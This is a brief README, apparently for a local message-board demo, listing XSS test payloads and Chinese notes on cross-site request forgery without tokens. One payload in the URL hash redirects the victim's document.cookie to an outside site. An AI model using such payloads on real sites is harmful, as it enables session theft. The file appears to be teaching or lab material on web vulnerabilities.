# mesage_board
node app.js
http://localhost:3000/
xss
1:input输入<script type="text/javascript">alert('xss')</script>
2:链接hash  http://localhost:3000/#<script>alert(1)</script>
3:http://localhost:3000/#<script>location.href="http://www.baidu.com/?"+document.cookie</script>

csrf
2:a域向b域提交
3:a域向b域提交表单信息，但是没有token
